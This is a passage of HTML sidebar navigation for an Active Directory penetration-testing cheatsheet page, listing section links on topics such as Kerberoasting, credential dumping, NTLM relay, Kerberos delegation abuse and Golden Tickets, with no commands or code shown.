                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-krbrelayup" class="text-limit-lines-1 block">KrbRelayUp</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-with-rbcd" class="text-limit-lines-1 block">With RBCD</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-with-shadowcreds" class="text-limit-lines-1 block">With ShadowCreds</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-massive-local-prives" class="text-limit-lines-1 block">Massive local privesc cheatsheet</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-escape-jea" class="text-limit-lines-1 block">Escape JEA</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-abuse-an-allowed-fun" class="text-limit-lines-1 block">Abuse an allowed function</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-function-creation" class="text-limit-lines-1 block">Function creation</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-with-another-winrrm-" class="text-limit-lines-1 block">With another WinrRM client</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h1">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-local-persistence" class="text-limit-lines-1 block">Local Persistence</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-sharpersist" class="text-limit-lines-1 block">SharPersist</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-laps-persistence" class="text-limit-lines-1 block">LAPS Persistence</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-jea-persistence" class="text-limit-lines-1 block">JEA Persistence</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h1">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-lateral-movement" class="text-limit-lines-1 block">Lateral Movement</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-powershell-remoting" class="text-limit-lines-1 block">PowerShell Remoting</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-from-one-computer-to" class="text-limit-lines-1 block">From one computer to other ones</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-execute-scripts" class="text-limit-lines-1 block">Execute scripts</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-execute-locally-load" class="text-limit-lines-1 block">Execute locally loaded function to remote</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-item-copy" class="text-limit-lines-1 block">Item copy</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-scheduled-task-creat" class="text-limit-lines-1 block">Scheduled task creation</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-credentials-gatherin" class="text-limit-lines-1 block">Credentials gathering / Mimikatz</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-dump-creds" class="text-limit-lines-1 block">Dump creds</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-credentials-vault-%26-" class="text-limit-lines-1 block">Credentials Vault &amp; DPAPI</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-lazagne" class="text-limit-lines-1 block">Lazagne</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-bypass-runasppl" class="text-limit-lines-1 block">Bypass RunAsPPL</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-pass-the-hash" class="text-limit-lines-1 block">Pass The Hash</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-over-pass-the-hash-%2F" class="text-limit-lines-1 block">Over Pass The Hash / Pass The Key</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-bypass-kerberos-doub" class="text-limit-lines-1 block">Bypass Kerberos Double Hop</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-token-manipulation" class="text-limit-lines-1 block">Token Manipulation</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-standard-token-imper" class="text-limit-lines-1 block">Standard Token Impersonation</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-token-impersonation-" class="text-limit-lines-1 block">Token impersonation via session leaking</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-tokens-and-adcs" class="text-limit-lines-1 block">Tokens and ADCS</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-adidns-poisoning" class="text-limit-lines-1 block">ADIDNS Poisoning</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-wildcard-attack-with" class="text-limit-lines-1 block">Wildcard attack with Powermad</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-dns-update-with-invo" class="text-limit-lines-1 block">DNS update with Invoke-DNSUpdate</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-feature-abuse" class="text-limit-lines-1 block">Feature Abuse</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-jenkins" class="text-limit-lines-1 block">Jenkins</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-sccm" class="text-limit-lines-1 block">SCCM</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-wsus" class="text-limit-lines-1 block">WSUS</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h1">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-domain-privesc" class="text-limit-lines-1 block">Domain Privesc</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-kerberoast" class="text-limit-lines-1 block">Kerberoast</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-find-users-with-spn" class="text-limit-lines-1 block">Find users with SPN</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-request-tgs" class="text-limit-lines-1 block">Request TGS</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-export-the-ticket" class="text-limit-lines-1 block">Export the ticket</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-crack-the-ticket" class="text-limit-lines-1 block">Crack the ticket</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-rubeus" class="text-limit-lines-1 block">Rubeus</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-kerberoast-w%2Fo-creds" class="text-limit-lines-1 block">Kerberoast w/o creds</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-without-pre-authenti" class="text-limit-lines-1 block">Without pre-authentication</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-with-mitm" class="text-limit-lines-1 block">With MitM</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-as-rep-roasting" class="text-limit-lines-1 block">AS-REP Roasting</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-enumerate-users" class="text-limit-lines-1 block">Enumerate users</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-disable-kerberos-pre" class="text-limit-lines-1 block">Disable Kerberos Preauth</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-request-as-rep" class="text-limit-lines-1 block">Request AS-REP</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-crack-the-hash" class="text-limit-lines-1 block">Crack the hash</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-acls-attacks" class="text-limit-lines-1 block">ACLs Attacks</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-acls-packages" class="text-limit-lines-1 block">ACLs packages</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-on-any-objects" class="text-limit-lines-1 block">On any objects</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h4">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-writeowner" class="text-limit-lines-1 block">WriteOwner</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h4">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-writedacl" class="text-limit-lines-1 block">WriteDacl</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-on-an-user" class="text-limit-lines-1 block">On an user</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h4">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-writeproperty" class="text-limit-lines-1 block">WriteProperty</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h4">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-user-force-change-pa" class="text-limit-lines-1 block">User-Force-Change-Password</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-on-a-computer" class="text-limit-lines-1 block">On a computer</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h4">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-writeproperty-0" class="text-limit-lines-1 block">WriteProperty</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h4">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-allextendedrights" class="text-limit-lines-1 block">AllExtendedRights</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-on-a-group" class="text-limit-lines-1 block">On a group</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h4">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-writeproperty%2Fallext" class="text-limit-lines-1 block">WriteProperty/AllExtendedRights/GenericWrite Self</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-on-gpo" class="text-limit-lines-1 block">On GPO</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h4">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-writeproperty-on-a-g" class="text-limit-lines-1 block">WriteProperty on a GPO</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h4">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-createchild-on-polic" class="text-limit-lines-1 block">CreateChild on Policies Cn + WriteProperty on an OU</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-on-the-domain%2Fforest" class="text-limit-lines-1 block">On the domain/forest</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h4">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-ds-replication-get-c" class="text-limit-lines-1 block">DS-Replication-Get-Changes + DS-Replication-Get-Changes-All</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h4">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-ds-replication-get-c-0" class="text-limit-lines-1 block">DS-Replication-Get-Changes + DS-Replication-Get-Changes-In-Filtered-Set</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-account-operators" class="text-limit-lines-1 block">Account Operators</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-add-user-to-laps-gro" class="text-limit-lines-1 block">Add user to LAPS groups</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-read-laps-password" class="text-limit-lines-1 block">Read LAPS password</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-dns-admin" class="text-limit-lines-1 block">DNS Admin</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-configure-the-dll" class="text-limit-lines-1 block">Configure the DLL</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-restart-dns" class="text-limit-lines-1 block">Restart DNS</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-schema-admin" class="text-limit-lines-1 block">Schema Admin</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-change-acls-on-the-g" class="text-limit-lines-1 block">Change ACLs on the groups</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-backup-operators" class="text-limit-lines-1 block">Backup Operators</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-file-system-backup" class="text-limit-lines-1 block">File system backup</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-registry-read-rights" class="text-limit-lines-1 block">Registry read rights</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-gpos-read%2Fwrite-righ" class="text-limit-lines-1 block">GPOs read/write rights</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h1">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-ntlm" class="text-limit-lines-1 block">NTLM</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-capture%2C-coerce-and-" class="text-limit-lines-1 block">Capture, Coerce and Leak NTLM</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-responder-%2F-inveigh" class="text-limit-lines-1 block">Responder / Inveigh</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-leak-files" class="text-limit-lines-1 block">Leak Files</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-mitm6" class="text-limit-lines-1 block">MITM6</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-petitpotam-%2F-printer" class="text-limit-lines-1 block">PetitPotam / PrinterBug / ShadowCoerce / DFSCoerce / CheeseOunce</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-mssql-coerce" class="text-limit-lines-1 block">MSSQL Coerce</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-privexchange" class="text-limit-lines-1 block">PrivExchange</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-webclient-service" class="text-limit-lines-1 block">WebClient Service</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-ntlm-relay" class="text-limit-lines-1 block">NTLM Relay</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-smb-without-signing" class="text-limit-lines-1 block">SMB without signing</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-ntlmrelayx" class="text-limit-lines-1 block">ntlmrelayx</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h1">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-kerberos-delegations" class="text-limit-lines-1 block">Kerberos Delegations</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-unconstrained-delega-0" class="text-limit-lines-1 block">Unconstrained delegation</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-compromised-machine-" class="text-limit-lines-1 block">Compromised machine in Unconstrained Delegation</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-printer-bug-%2F-petitp" class="text-limit-lines-1 block">Printer bug / PetitPotam</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-any-principal-in-unc" class="text-limit-lines-1 block">Any principal in Unconstrained Delegation</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-constrained-delegati" class="text-limit-lines-1 block">Constrained Delegation</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-enumerate-principals" class="text-limit-lines-1 block">Enumerate principals with CD enabled</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-with-protocol-transi" class="text-limit-lines-1 block">With protocol transition</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-without-protocol-tra" class="text-limit-lines-1 block">Without protocol transition</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-resource-based-const" class="text-limit-lines-1 block">Resource-Based Constrained Delegation</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-requirements" class="text-limit-lines-1 block">Requirements</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-standard-rbcd" class="text-limit-lines-1 block">Standard RBCD</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-with-machine-account" class="text-limit-lines-1 block">With machine account creation</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-skip-s4uself" class="text-limit-lines-1 block">Skip S4USelf</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-reflective-rbcd" class="text-limit-lines-1 block">Reflective RBCD</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-impersonate-protecte" class="text-limit-lines-1 block">Impersonate protected user via S4USelf request</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-bypass-constrained-d" class="text-limit-lines-1 block">Bypass Constrained Delegation restrictions with RBCD</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-rbcd-from-mssql-serv" class="text-limit-lines-1 block">RBCD from MSSQL server</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h1">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-domain-persistence" class="text-limit-lines-1 block">Domain Persistence</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-diamond-ticket" class="text-limit-lines-1 block">Diamond Ticket</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-golden-ticket" class="text-limit-lines-1 block">Golden Ticket</a>
